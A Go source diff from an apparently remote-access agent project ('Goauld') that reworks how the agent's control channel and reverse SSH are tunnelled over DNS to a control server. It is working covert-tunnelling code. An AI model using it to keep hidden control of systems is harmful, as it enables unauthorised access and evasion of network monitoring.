@@ -3,17 +3,15 @@ package control
 import (
 	globalcontext "Goauld/agent/context"
 	"Goauld/agent/proxy"
-	"Goauld/agent/ssh/transport"
+	"Goauld/agent/ssh/transport/blind"
+	"Goauld/agent/ssh/transport/dns"
 	"context"
-	"errors"
 	"fmt"
-	"strings"
+	"net"
 	"time"
 
 	"Goauld/agent/config"
 	"Goauld/common/log"
-
-	"github.com/xtaci/smux"
 
 	socketio "Goauld/common/socket.io"
 
@@ -97,22 +95,38 @@ func (cpc *ControlPlanClient) InitPolling(success chan<- struct{}, chanErr chan<
 	return cpc.init(cfg, success, chanErr)
 }
 
-// InitOverDNS tries to connect to the control plan using the DNS transport.
-func (cpc *ControlPlanClient) InitOverDNS(session *smux.Stream, success chan<- struct{}, chanErr chan<- error) error {
-	_, err := session.Write([]byte(config.Get().ID))
-	// DNS MODE means we are using http to simplify the exchanges
-	u := strings.TrimPrefix(strings.TrimPrefix(config.Get().SocketIoURL(config.Get().ID), "https://"), "http://")
-	cpc.url = "http://" + u
-	if err != nil {
-		return fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
+func (cpc *ControlPlanClient) InitControlOverDNSAlt(success chan<- struct{}, chanErr chan<- error) error {
+	dnsServers := dns.GetDNSServers()
+	if len(dnsServers) == 0 {
+		return fmt.Errorf("no DNS servers found")
 	}
-	_, err = session.Write([]byte{'C'})
-	if err != nil {
-		return fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
-	}
-	cfg := getDNSEioConfig(session)
 
-	return cpc.init(cfg, success, chanErr)
+	dnsClient, err := blind.NewDNSClient(config.Get().DNSServer(), config.Get().DNSDomainAlt(), true, "control", config.Get().ID)
+	if err != nil {
+		log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
+
+		return err
+	}
+	conn1, conn2 := net.Pipe()
+	go dnsClient.Tunnel(conn2)
+	log.Debug().Str("Mode", "DNSSH").Msg("Trying to mount SSH over the DNS connection")
+	// Write S tag to inform the incoming SSH traffic
+	//_, err = conn2.Write([]byte{'S'})
+	//if err != nil {
+	//	log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
+	//
+	//	return err
+	//}
+
+	err = cpc.InitOverDNSAlt(conn1, success, chanErr)
+	if err != nil {
+		return err
+	}
+
+	// As the  control socket is established using DNS we consider that the only working protocol is DNS
+	// so we set the RSSH protocol order to only DNS
+	config.Get().SetRSSHOrder([]string{"DNS-ALT"})
+	return nil
 }
 
 // Init initializes the socket.io handlers.
@@ -206,59 +220,6 @@ func getEioConfig(tr []string) *sio.ManagerConfig {
 				HTTPHeader: proxy.NewHeaderMap(),
 			},
 			Transports: tr,
-		},
-	}
-}
-
-func GetRelayEioConfig(mode string, dnsTransport *transport.DNSSH) (*sio.ManagerConfig, error) {
-	switch strings.ToLower(mode) {
-	case "websocket":
-		return getEioConfig([]string{"websocket"}), nil
-	case "upgrade":
-		return getEioConfig([]string{"polling", "websocket"}), nil
-	case "polling":
-		return getEioConfig([]string{"polling"}), nil
-	case "dns":
-		stream, err := dnsTransport.OpenStream()
-		if err != nil {
-			log.Error().Err(err).Msg("Error opening stream")
-
-			return nil, err
-		}
-
-		_, err = stream.Write([]byte(config.Get().ID))
-		if err != nil {
-			log.Error().Err(err).Msg("Error writing to stream")
-
-			return nil, err
-		}
-		_, err = stream.Write([]byte{'C'})
-		if err != nil {
-			return nil, fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
-		}
-
-		return getDNSEioConfig(stream), nil
-	}
-
-	return nil, errors.New("unable to open Relay Socket.IO config")
-}
-
-// getEioConfig return the socket.io underlying configuration.
-func getDNSEioConfig(session *smux.Stream) *sio.ManagerConfig {
-	return &sio.ManagerConfig{
-		EIO: eio.ClientConfig{
-			UpgradeDone: func(transportName string) {
-				log.Trace().Str("Transport", transportName).Msg("Client transport upgrade done")
-			},
-			HTTPTransport: NewSmuxTransport(session),
-			WebSocketDialOptions: &websocket.DialOptions{
-				HTTPClient: newSmuxHTTPandHTTPSClient(session),
-			},
-			// When tunneling over DNS, if we use polling only or polling then websocket upgrade,
-			// The tunnel fails to establish properly as the server responds to unwanted content to the open HTTP socket.
-			// Here we use the full duplex websocket mechanism to ensure that the tunnel is properly working
-			// On the client side
-			Transports: []string{"websocket"},
 		},
 	}
 }
